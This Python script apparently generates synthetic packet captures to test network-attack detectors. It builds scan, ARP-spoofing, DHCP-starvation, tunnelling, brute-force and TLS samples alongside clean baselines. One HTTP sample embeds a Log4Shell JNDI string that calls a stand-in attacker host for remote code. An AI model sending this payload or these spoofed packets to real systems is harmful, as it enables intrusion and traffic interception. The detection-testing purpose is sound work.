"""
Builds one synthetic .pcapng per detector scenario under samples/, the same
role make_samples.py / make_pcap.py play in nsmkit and phishkit: every
sample is small, hand-crafted, and documents in its own comments exactly
which detector it's meant to trip (or, for the negative-case files, *not*
trip).

Usage: python tools/make_traf_pcaps.py [outdir]    (default: samples/trafkit; needs scapy)
"""

from __future__ import annotations

import base64
import os
import struct
import sys
import time

from scapy.all import ARP, ICMP, IP, TCP, UDP, Ether, Raw, wrpcapng
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.netbios import NBNSHeader, NBNSQueryRequest

T0 = time.time() - 3600  # capture "started" an hour ago

# Link-layer addresses come from the RFC 7042 documentation block
# (00:00:5e:00:53:xx), one per host on the 192.168.1.0/24 LAN; anything off
# the LAN is reached through the gateway's MAC, as on a real wire. A bare
# Ether() would make scapy stamp the generating machine's own network card
# address into every sample (and broadcast as the destination, since these
# made-up addresses can't be ARP-resolved).
LAN_PREFIX = "192.168.1."
GATEWAY_MAC = "00:00:5e:00:53:01"


def _mac(ip: str) -> str:
    if not ip.startswith(LAN_PREFIX):
        return GATEWAY_MAC
    return f"00:00:5e:00:53:{int(ip.rsplit('.', 1)[1]):02x}"


def _eth(src_ip: str, dst_ip: str):
    return Ether(src=_mac(src_ip), dst=_mac(dst_ip))


def _at(pkt, dt: float):
    pkt.time = T0 + dt
    return pkt


def _eth_ip_tcp(src, dst, sport, dport, flags, seq=0, ack=0, window=64240, load=None):
    pkt = _eth(src, dst) / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags=flags,
                                                seq=seq, ack=ack, window=window)
    if load:
        pkt = pkt / Raw(load=load)
    return pkt


# --------------------------------------------------------------------------
# 1. Nmap TCP Connect scan -- full handshake, window > 1024, many ports
# --------------------------------------------------------------------------

def make_nmap_connect(outdir):
    pkts = []
    src, dst = "192.168.1.50", "192.168.1.10"
    t = 0.0
    open_ports = {22, 80, 443}
    for port in range(1, 26):
        sport = 40000 + port
        pkts.append(_at(_eth_ip_tcp(src, dst, sport, port, "S", seq=1000, window=64240), t))
        t += 0.002
        if port in open_ports:
            pkts.append(_at(_eth_ip_tcp(dst, src, port, sport, "SA", seq=5000, ack=1001, window=65535), t))
            t += 0.002
            pkts.append(_at(_eth_ip_tcp(src, dst, sport, port, "A", seq=1001, ack=5001), t))
            t += 0.002
            pkts.append(_at(_eth_ip_tcp(src, dst, sport, port, "RA", seq=1001, ack=5001), t))
        else:
            pkts.append(_at(_eth_ip_tcp(dst, src, port, sport, "RA", seq=0, ack=1001, window=0), t))
        t += 0.01
    wrpcapng(os.path.join(outdir, "nmap_connect.pcapng"), pkts)


# --------------------------------------------------------------------------
# 2. Nmap SYN scan -- half-open, window <= 1024, many ports
# --------------------------------------------------------------------------

def make_nmap_syn(outdir):
    pkts = []
    src, dst = "192.168.1.51", "192.168.1.11"
    t = 0.0
    open_ports = {22, 3389, 445}
    for port in range(1, 22):
        sport = 41000 + port
        pkts.append(_at(_eth_ip_tcp(src, dst, sport, port, "S", seq=2000, window=1024), t))
        t += 0.002
        if port in open_ports:
            pkts.append(_at(_eth_ip_tcp(dst, src, port, sport, "SA", seq=6000, ack=2001, window=65535), t))
            t += 0.001
            pkts.append(_at(_eth_ip_tcp(src, dst, sport, port, "R", seq=2001, ack=6001), t))
        else:
            pkts.append(_at(_eth_ip_tcp(dst, src, port, sport, "RA", seq=0, ack=2001, window=0), t))
        t += 0.01
    wrpcapng(os.path.join(outdir, "nmap_syn.pcapng"), pkts)


# --------------------------------------------------------------------------
# 3. Nmap UDP scan -- ICMP port-unreachable for closed ports
# --------------------------------------------------------------------------

def make_nmap_udp(outdir):
    pkts = []
    prober, scanned = "192.168.1.52", "192.168.1.12"
    t = 0.0
    open_ports = {53, 123}
    for port in range(1, 15):
        sport = 42000 + port
        probe = _eth(prober, scanned) / IP(src=prober, dst=scanned) / UDP(sport=sport, dport=port) / Raw(load=b"\x00" * 8)
        pkts.append(_at(probe, t))
        t += 0.005
        if port not in open_ports:
            inner = IP(src=prober, dst=scanned) / UDP(sport=sport, dport=port) / Raw(load=b"\x00" * 8)
            unreachable = _eth(scanned, prober) / IP(src=scanned, dst=prober) / ICMP(type=3, code=3) / inner
            pkts.append(_at(unreachable, t))
        t += 0.01
    wrpcapng(os.path.join(outdir, "nmap_udp.pcapng"), pkts)


# --------------------------------------------------------------------------
# 4. Horizontal port sweep -- one port, many destination hosts
# --------------------------------------------------------------------------

def make_horizontal_scan(outdir):
    pkts = []
    src = "192.168.1.53"
    t = 0.0
    for i in range(1, 16):
        dst = f"192.168.1.{100 + i}"
        pkts.append(_at(_eth_ip_tcp(src, dst, 43000 + i, 3389, "S", seq=1, window=1024), t))
        t += 0.02
    wrpcapng(os.path.join(outdir, "horizontal_scan.pcapng"), pkts)


# --------------------------------------------------------------------------
# 5. ARP spoofing + MITM relay
# --------------------------------------------------------------------------

def make_arp_spoof(outdir):
    pkts = []
    gw_ip, gw_mac = "192.168.1.1", "50:78:b3:f3:cd:f4"
    victim_ip, victim_mac = "192.168.1.12", "00:0c:29:98:c7:a8"
    attacker_ip, attacker_mac = "192.168.1.25", "00:0c:29:e2:18:b4"
    t = 0.0

    # Legitimate baseline: victim asks who has the gateway, gateway replies.
    pkts.append(_at(Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=1, hwsrc=victim_mac, psrc=victim_ip, pdst=gw_ip), t)); t += 0.05
    pkts.append(_at(Ether(src=gw_mac, dst=victim_mac) /
                    ARP(op=2, hwsrc=gw_mac, psrc=gw_ip, hwdst=victim_mac, pdst=victim_ip), t)); t += 1.0

    # Attacker announces itself as both the gateway and the victim (gratuitous replies).
    pkts.append(_at(Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=2, hwsrc=attacker_mac, psrc=gw_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=gw_ip), t)); t += 0.01
    pkts.append(_at(Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=2, hwsrc=attacker_mac, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip), t)); t += 0.01

    # Poison both sides directly as well.
    pkts.append(_at(Ether(src=attacker_mac, dst=victim_mac) /
                    ARP(op=2, hwsrc=attacker_mac, psrc=gw_ip, hwdst=victim_mac, pdst=victim_ip), t)); t += 0.02
    pkts.append(_at(Ether(src=attacker_mac, dst=gw_mac) /
                    ARP(op=2, hwsrc=attacker_mac, psrc=victim_ip, hwdst=gw_mac, pdst=gw_ip), t)); t += 0.5

    # Now the victim's "web browsing" is relayed through the attacker: link
    # layer destination is the attacker's MAC, but the IP destination is
    # still the real web server out past the gateway.
    webserver_ip = "172.217.22.14"
    for i in range(4):
        pkts.append(_at(Ether(src=victim_mac, dst=attacker_mac) /
                        IP(src=victim_ip, dst=webserver_ip) /
                        TCP(sport=54000 + i, dport=80, flags="PA", seq=1 + i * 100, ack=1) /
                        Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"), t))
        t += 0.3
    wrpcapng(os.path.join(outdir, "arp_spoof.pcapng"), pkts)


# --------------------------------------------------------------------------
# 6. ARP flood / sweep
# --------------------------------------------------------------------------

def make_arp_flood(outdir):
    pkts = []
    attacker_mac = "aa:bb:cc:00:11:22"
    t = 0.0
    for i in range(1, 26):
        target = f"192.168.1.{i}"
        pkts.append(_at(Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") /
                        ARP(op=1, hwsrc=attacker_mac, psrc="192.168.1.200", pdst=target), t))
        t += 0.05
    wrpcapng(os.path.join(outdir, "arp_flood.pcapng"), pkts)


# --------------------------------------------------------------------------
# 7. DHCP + NBNS + Kerberos host/user identification
# --------------------------------------------------------------------------

def make_dhcp_nbns_kerberos(outdir):
    pkts = []
    t = 0.0
    client_mac = "08:00:27:aa:bb:cc"
    client_ip = "192.168.1.16"
    server_ip = "192.168.1.1"

    discover = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
                BOOTP(chaddr=bytes.fromhex(client_mac.replace(":", "")) + b"\x00" * 10, xid=1) /
                DHCP(options=[("message-type", "discover"), ("hostname", b"WIN-016"), "end"]))
    pkts.append(_at(discover, t)); t += 0.05

    offer = (Ether(src="00:11:22:33:44:55", dst=client_mac) /
             IP(src=server_ip, dst=client_ip) / UDP(sport=67, dport=68) /
             BOOTP(chaddr=bytes.fromhex(client_mac.replace(":", "")) + b"\x00" * 10, yiaddr=client_ip, xid=1) /
             DHCP(options=[("message-type", "offer"), ("server_id", server_ip), "end"]))
    pkts.append(_at(offer, t)); t += 0.05

    request = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
               BOOTP(chaddr=bytes.fromhex(client_mac.replace(":", "")) + b"\x00" * 10, xid=1) /
               DHCP(options=[("message-type", "request"), ("hostname", b"WIN-016"),
                              ("requested_addr", client_ip), "end"]))
    pkts.append(_at(request, t)); t += 0.05

    ack = (Ether(src="00:11:22:33:44:55", dst=client_mac) /
           IP(src=server_ip, dst=client_ip) / UDP(sport=67, dport=68) /
           BOOTP(chaddr=bytes.fromhex(client_mac.replace(":", "")) + b"\x00" * 10, yiaddr=client_ip, xid=1) /
           DHCP(options=[("message-type", "ack"), ("domain", b"corp.local"),
                          ("lease_time", 86400), "end"]))
    pkts.append(_at(ack, t)); t += 1.0

    # NBNS name query.
    nbns = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=client_ip, dst="192.168.1.255") / UDP(sport=137, dport=137) /
            NBNSHeader(NAME_TRN_ID=0x1234, OPCODE=0, NM_FLAGS=0x11, QDCOUNT=1) /
            NBNSQueryRequest(QUESTION_NAME="WIN-016"))
    pkts.append(_at(nbns, t)); t += 0.2

    # Kerberos AS-REQ (best-effort synthetic; see pcapread._apply_kerberos
    # for why the fallback GeneralString scan exists).
    krb_bytes = _build_kerberos_as_req("jdoe", "CORP.LOCAL", "WIN-016$")
    krb_pkt = (Ether(src=client_mac, dst="00:11:22:33:44:66") /
               IP(src=client_ip, dst="192.168.1.2") / UDP(sport=50000, dport=88) /
               Raw(load=krb_bytes))
    pkts.append(_at(krb_pkt, t)); t += 0.1

    # DHCP starvation: one attacker source cycling through many spoofed
    # client MACs' DISCOVER packets.
    for i in range(15):
        fake_mac = f"de:ad:be:ef:{i:02x}:{i:02x}"
        starve = (Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                  IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) /
                  BOOTP(chaddr=bytes.fromhex(fake_mac.replace(":", "")) + b"\x00" * 10, xid=100 + i) /
                  DHCP(options=[("message-type", "discover"), "end"]))
        starve[IP].src = client_ip  # relayed from one attacking source IP
        pkts.append(_at(starve, t)); t += 0.02

    wrpcapng(os.path.join(outdir, "dhcp_nbns_kerberos.pcapng"), pkts)


def _build_kerberos_as_req(username: str, realm: str, hostname: str) -> bytes:
    """Minimal hand-rolled BER TLV encoding of just enough Kerberos AS-REQ
    structure for the GeneralString fallback scanner to recover the realm,
    username and client hostname -- see pcapread._ber_general_strings."""
    def gstr(s: str) -> bytes:
        b = s.encode("ascii")
        return bytes([0x1B, len(b)]) + b

    def seq(tag: int, content: bytes) -> bytes:
        return bytes([tag]) + _ber_len(len(content)) + content

    principal_user = seq(0xA1, seq(0x30, gstr(username)))
    principal_host = seq(0xA3, seq(0x30, gstr(hostname)))
    realm_field = seq(0xA2, gstr(realm))
    body = principal_user + realm_field + principal_host
    return seq(0x6A, seq(0x30, body))  # loosely tagged AS-REQ-ish wrapper


def _ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


# --------------------------------------------------------------------------
# 8. ICMP tunnelling -- oversized echo payloads
# --------------------------------------------------------------------------

def make_icmp_tunnel(outdir):
    pkts = []
    src, dst = "192.168.1.30", "203.0.113.66"
    t = 0.0
    payload = os.urandom(400)
    for i in range(25):
        req = _eth(src, dst) / IP(src=src, dst=dst) / ICMP(type=8, id=1, seq=i) / Raw(load=payload)
        pkts.append(_at(req, t)); t += 1.0
        rep = _eth(dst, src) / IP(src=dst, dst=src) / ICMP(type=0, id=1, seq=i) / Raw(load=payload)
        pkts.append(_at(rep, t)); t += 0.2
    # A normal-sized ping in the same capture: must NOT be flagged.
    for i in range(3):
        req = _eth(src, "192.168.1.1") / IP(src=src, dst="192.168.1.1") / ICMP(type=8, id=2, seq=i) / Raw(load=b"\x00" * 32)
        pkts.append(_at(req, t)); t += 1.0
    wrpcapng(os.path.join(outdir, "icmp_tunnel.pcapng"), pkts)


# --------------------------------------------------------------------------
# 9. DNS tunnelling -- long, encoded-looking subdomains
# --------------------------------------------------------------------------

def make_dns_tunnel(outdir):
    pkts = []
    src, resolver = "192.168.1.16", "192.168.1.1"
    t = 0.0
    import random
    random.seed(7)
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(20):
        label = "".join(random.choice(alphabet) for _ in range(45))
        qname = f"{label}.malicious-tld.example"
        q = (_eth(src, resolver) / IP(src=src, dst=resolver) / UDP(sport=53000 + i, dport=53) /
             DNS(id=i, rd=1, qd=DNSQR(qname=qname, qtype="TXT")))
        pkts.append(_at(q, t)); t += 0.3
    # Normal DNS traffic in the same capture: must NOT be flagged.
    for i, name in enumerate(["www.example.com", "api.github.com", "mail.corp.local"]):
        q = (_eth(src, resolver) / IP(src=src, dst=resolver) / UDP(sport=54000 + i, dport=53) /
             DNS(id=100 + i, rd=1, qd=DNSQR(qname=name, qtype="A")))
        pkts.append(_at(q, t)); t += 2.0
        a = (_eth(resolver, src) / IP(src=resolver, dst=src) / UDP(sport=53, dport=54000 + i) /
             DNS(id=100 + i, qr=1, qd=DNSQR(qname=name, qtype="A"),
                 an=DNSRR(rrname=name, type="A", ttl=300, rdata="93.184.216.34")))
        pkts.append(_at(a, t)); t += 0.05
    wrpcapng(os.path.join(outdir, "dns_tunnel.pcapng"), pkts)


# --------------------------------------------------------------------------
# 10. FTP brute force + password spray + one clean login
# --------------------------------------------------------------------------

def make_ftp_bruteforce(outdir):
    pkts = []
    server = "192.168.1.20"
    t = 0.0

    def ftp_exchange(client, cmd_line, resp_line, seq_base):
        nonlocal t
        req = (_eth(client, server) / IP(src=client, dst=server) / TCP(sport=41000, dport=21, flags="PA", seq=seq_base) /
               Raw(load=(cmd_line + "\r\n").encode()))
        pkts.append(_at(req, t)); t += 0.05
        resp = (_eth(server, client) / IP(src=server, dst=client) / TCP(sport=21, dport=41000, flags="PA", seq=seq_base + 1) /
                Raw(load=(resp_line + "\r\n").encode()))
        pkts.append(_at(resp, t)); t += 0.1

    # Brute force: one client, many failed passwords for "admin".
    brute_client = "192.168.1.60"
    for i in range(8):
        ftp_exchange(brute_client, "USER admin", "331 Password required", 1000 + i * 10)
        ftp_exchange(brute_client, f"PASS guess{i}", "530 Login incorrect", 1002 + i * 10)

    # Password spray: many usernames, one password, against the same server.
    for i in range(6):
        spray_client = f"192.168.1.{70 + i}"
        ftp_exchange(spray_client, f"USER user{i}", "331 Password required", 2000 + i * 10)
        ftp_exchange(spray_client, "PASS Summer2024!", "530 Login incorrect", 2002 + i * 10)

    # One clean, successful login: must not itself be flagged as a failure.
    ftp_exchange("192.168.1.80", "USER svc_backup", "331 Password required", 3000)
    ftp_exchange("192.168.1.80", "PASS correcthorse", "230 Login successful", 3002)

    wrpcapng(os.path.join(outdir, "ftp_bruteforce.pcapng"), pkts)


# --------------------------------------------------------------------------
# 11. HTTP anomalies -- scanner UA, Log4Shell, file download, clean browsing
# --------------------------------------------------------------------------

def make_http_traffic(outdir):
    pkts = []
    t = 0.0

    def http_exchange(client, server, req_bytes, resp_bytes):
        nonlocal t
        req = (_eth(client, server) / IP(src=client, dst=server) / TCP(sport=50000, dport=80, flags="PA", seq=1) /
               Raw(load=req_bytes))
        pkts.append(_at(req, t)); t += 0.05
        resp = (_eth(server, client) / IP(src=server, dst=client) / TCP(sport=80, dport=50000, flags="PA", seq=1) /
                Raw(load=resp_bytes))
        pkts.append(_at(resp, t)); t += 0.2

    # Clean browsing: must not be flagged.
    http_exchange(
        "192.168.1.40", "93.184.216.34",
        b"GET /index.html HTTP/1.1\r\nHost: www.example.com\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\r\n\r\n",
        b"HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: text/html\r\n\r\n<html></html>",
    )

    # Scanner user agent.
    http_exchange(
        "192.168.1.41", "192.168.1.20",
        b"GET /admin/ HTTP/1.1\r\nHost: intranet.corp.local\r\n"
        b"User-Agent: sqlmap/1.7.2#stable (http://sqlmap.org)\r\n\r\n",
        b"HTTP/1.1 403 Forbidden\r\nServer: Apache/2.4.41\r\nContent-Type: text/html\r\n\r\n",
    )

    # Log4Shell JNDI in the User-Agent.
    http_exchange(
        "203.0.113.90", "192.168.1.20",
        b"GET /api/status HTTP/1.1\r\nHost: intranet.corp.local\r\n"
        b"User-Agent: ${jndi:ldap://attacker.evil/Exploit.class}\r\n\r\n",
        b"HTTP/1.1 200 OK\r\nServer: Apache-Tomcat/9.0\r\nContent-Type: application/json\r\n\r\n{}",
    )

    # File download with Content-Disposition.
    http_exchange(
        "192.168.1.42", "192.168.1.21",
        b"GET /downloads/suspicious_package.zip HTTP/1.1\r\nHost: files.corp.local\r\n"
        b"User-Agent: curl/7.85.0\r\n\r\n",
        b"HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/zip\r\n"
        b'Content-Disposition: attachment; filename="suspicious_package.zip"\r\n\r\n',
    )

    # HTTP Basic-Auth and a plaintext login form -- for the creds extractor.
    basic = base64.b64encode(b"svc_reports:Sup3rSecret!").decode()
    http_exchange(
        "192.168.1.43", "192.168.1.22",
        f"GET /reports HTTP/1.1\r\nHost: reports.corp.local\r\n"
        f"Authorization: Basic {basic}\r\n\r\n".encode(),
        b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/html\r\n\r\n",
    )
    form_body = b"username=jsmith&password=hunter2"
    http_exchange(
        "192.168.1.44", "192.168.1.22",
        b"POST /login HTTP/1.1\r\nHost: portal.corp.local\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(form_body)).encode() + b"\r\n\r\n" + form_body,
        b"HTTP/1.1 302 Found\r\nServer: nginx\r\nLocation: /home\r\n\r\n",
    )

    wrpcapng(os.path.join(outdir, "http_traffic.pcapng"), pkts)


# --------------------------------------------------------------------------
# 12. TLS ClientHello with SNI (standard + unusual port)
# --------------------------------------------------------------------------

def _client_hello(sni: str) -> bytes:
    server_name = sni.encode()
    sni_entry = b"\x00" + struct.pack(">H", len(server_name)) + server_name
    sni_list = struct.pack(">H", len(sni_entry)) + sni_entry
    ext_server_name = struct.pack(">HH", 0x0000, len(sni_list)) + sni_list
    extensions = ext_server_name
    session_id = b""
    cipher_suites = b"\x00\x2f\x00\x35"
    compression = b"\x00"
    body = (b"\x03\x03" + os.urandom(32) +
            bytes([len(session_id)]) + session_id +
            struct.pack(">H", len(cipher_suites)) + cipher_suites +
            bytes([len(compression)]) + compression +
            struct.pack(">H", len(extensions)) + extensions)
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    record = b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake
    return record


def make_tls_handshake(outdir):
    pkts = []
    t = 0.0
    client = "192.168.1.45"

    hello = (_eth(client, "172.217.22.14") / IP(src=client, dst="172.217.22.14") /
             TCP(sport=51000, dport=443, flags="PA", seq=1) / Raw(load=_client_hello("www.example.com")))
    pkts.append(_at(hello, t)); t += 0.1

    # Same handshake, but riding on an unusual port -- should trip
    # TLS-PORT-01.
    hello2 = (_eth(client, "203.0.113.77") / IP(src=client, dst="203.0.113.77") /
              TCP(sport=51001, dport=8081, flags="PA", seq=1) / Raw(load=_client_hello("c2.attacker-infra.example")))
    pkts.append(_at(hello2, t)); t += 0.1

    wrpcapng(os.path.join(outdir, "tls_handshake.pcapng"), pkts)


# --------------------------------------------------------------------------
# 13. Clean baseline -- ordinary traffic that must trip *no* detector
# --------------------------------------------------------------------------

def make_clean_baseline(outdir):
    pkts = []
    t = 0.0
    client, server, resolver = "192.168.1.40", "93.184.216.34", "192.168.1.1"

    # A handful of full, unremarkable TCP handshakes + data transfer.
    for i in range(3):
        sport = 55000 + i
        pkts.append(_at(_eth_ip_tcp(client, server, sport, 443, "S", seq=1, window=64240), t)); t += 0.01
        pkts.append(_at(_eth_ip_tcp(server, client, 443, sport, "SA", seq=1, ack=2, window=65535), t)); t += 0.01
        pkts.append(_at(_eth_ip_tcp(client, server, sport, 443, "A", seq=2, ack=2), t)); t += 0.01
        pkts.append(_at(_eth_ip_tcp(client, server, sport, 443, "FA", seq=2, ack=2), t)); t += 2.0

    # Ordinary DNS lookups, resolved normally.
    for i, name in enumerate(["www.example.com", "api.github.com", "outlook.office365.com"]):
        q = (_eth(client, resolver) / IP(src=client, dst=resolver) / UDP(sport=56000 + i, dport=53) /
             DNS(id=i, rd=1, qd=DNSQR(qname=name, qtype="A")))
        pkts.append(_at(q, t)); t += 0.5
        a = (_eth(resolver, client) / IP(src=resolver, dst=client) / UDP(sport=53, dport=56000 + i) /
             DNS(id=i, qr=1, qd=DNSQR(qname=name, qtype="A"),
                 an=DNSRR(rrname=name, type="A", ttl=300, rdata="93.184.216.34")))
        pkts.append(_at(a, t)); t += 0.05

    # One ordinary browser HTTP request/response.
    req = (_eth(client, server) / IP(src=client, dst=server) / TCP(sport=57000, dport=80, flags="PA", seq=1) /
           Raw(load=b"GET /style.css HTTP/1.1\r\nHost: www.example.com\r\n"
                     b"User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0\r\n\r\n"))
    pkts.append(_at(req, t)); t += 0.05
    resp = (_eth(server, client) / IP(src=server, dst=client) / TCP(sport=80, dport=57000, flags="PA", seq=1) /
            Raw(load=b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/css\r\n\r\nbody{}"))
    pkts.append(_at(resp, t)); t += 0.05

    # A single ping -- ordinary size, must not read as an ICMP tunnel.
    ping = _eth(client, resolver) / IP(src=client, dst=resolver) / ICMP(type=8, id=99, seq=1) / Raw(load=b"\x00" * 32)
    pkts.append(_at(ping, t)); t += 0.01
    pong = _eth(resolver, client) / IP(src=resolver, dst=client) / ICMP(type=0, id=99, seq=1) / Raw(load=b"\x00" * 32)
    pkts.append(_at(pong, t))

    wrpcapng(os.path.join(outdir, "clean_baseline.pcapng"), pkts)


# --------------------------------------------------------------------------

def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples", "trafkit")
    os.makedirs(outdir, exist_ok=True)
    builders = [
        make_nmap_connect, make_nmap_syn, make_nmap_udp, make_horizontal_scan,
        make_arp_spoof, make_arp_flood, make_dhcp_nbns_kerberos,
        make_icmp_tunnel, make_dns_tunnel, make_ftp_bruteforce,
        make_http_traffic, make_tls_handshake, make_clean_baseline,
    ]
    for fn in builders:
        fn(outdir)
        print(f"  wrote {fn.__name__}")
    print(f"Wrote {len(builders)} sample captures to {outdir}/")


if __name__ == "__main__":
    main()
